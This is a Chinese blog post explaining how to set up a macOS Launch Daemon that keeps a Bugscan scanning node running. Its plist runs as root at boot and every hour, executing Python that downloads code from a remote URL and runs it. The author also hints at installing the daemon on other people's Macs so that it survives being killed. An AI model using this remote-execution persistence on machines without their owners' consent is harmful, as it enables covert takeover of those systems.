#Mac OS X 开机启动脚本

### 写在前面

扫描的时候常时间不看有时候节点会掉，每次都去手动构建一次真的很烦，于是考虑用计划任务来自动构建节点。Linux 下关于 corntab 的文章多了去了，这里我记录下 Mac OS X 的计划任务，构建节点只是一个用处而己。用 Mac 的人那么多，真正关心这个的人倒没多少。

Mac OS X内置的一种称为 Launch Daemon/Agent 的机制来实现系统启动时自动执行脚本程序。OS X 从10.4 开始，采用 launchd 进程来管理整个操作系统的服务及进程。传统的 UNIX 会使用 /etc/rc.* 或其他的机制来管理开机时要启动的启动服务，而现在的 OS X 则使用 launchd 来管理，它的启动服务称为 Launch Daemon/Agents, 利用 Launch Daemon/Agent，我们就可以令脚本程序在系统启动的时候在后台运行了。

首先来看下 Launch Daemon 和 Launch Agent 有什么区别

Launch Daemon 和 Launch Agent 是同一种东西在不同应用范围的名称。Launch Daemon 是系统级别的服务，称为 daemon，Launch Agent 是用户级别的服务，称为agent，前者在开机时会加载，后者在用户登录后才会加载。

于是我们就选用 Daemon，至于为什么，其实我最初的想法是在别人的 Mac 上写这个文件的，这样对于一些不懂 Launch 的人来说，使用 kill 杀掉我们的节点之后，还是会启动起来的，好了这个不能说太多。

### 配置开始

  1. 创建 plist 文件

```
sudo vi /Library/LaunchDaemons/bugscan.plist
```


文件内容如下：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.bugscan.net</string>
<key>ProgramArguments</key>
<array>
<string>python</string>
<string>-c</string>
<string>exec(__import__('urllib2').urlopen('https://www.bugscan.net/这里是你自己的用户标识').read())</string>
<string>-m</string>
<string>5</string>
</array>
<key>RunAtLoad</key>
<true/>
<key>StartCalendarInterval</key>
<dict>
<key>Minute</key>
<integer>20</integer>
</dict>
</dict>
</plist>
```


  * Label (必须)
  
    > 该项服务的名称
  * Program
  
    > 指定可执行文件的路径和名称, 如果没有 ProgramArguments 的话, Program 是必选的
  * ProgramArguments (如果没指定 Program, 则必须指定)
  
    > 指定可执行文件路径及其参数，例如上面的配置就相当于在命令行下执行了`python -c "exec(__import__('urllib2').urlopen('https://www.bugscan.net/这里是你自己的用户标识').read())" -m 5`
  * RunAtLoad (可选)
  
    > 标识launchd在加载完该项服务之后立即启动路径指定的可执行文件。默认值为 false,设置为 true 即可实现开机运行脚本文件。
  * StartCalendarInterval (可选)
  
    > 该关键字可以用来设置定时执行可执行程序，可使用 Month, Day, Hour, Minute, Second等子关键字，它可以指定脚本在多少月，天，小时，分钟，秒，星期几等时间上执行，若缺少某个关键字则表示任意该时间点，类似于 Unix 的 Crontab 计划任务的设置方式，比如在该例子中设置为每小时的20分的时候执行该命令。

所有key关键字详细使用说明可以在Mac OS X终端下使用命令 `man launchd.plist` 查询。

1.修改plist文件权限

```
sudo chown root:wheel /Library/LaunchDaemons/bugscan.plist
sudo chmod 644 /Library/LaunchDaemons/bugscan.plist
```


2.生效配置

```
# 载入配置
sudo launchctl load /Library/LaunchDaemons/bugscan.plist
# 卸载配置
sudo launchctl unload /Library/LaunchDaemons/bugscan.plist
# 检查语法是否正确
plutil /Library/LaunchDaemons/bugscan.plist
# 查看服务运行状态
sudo launchctl list
```




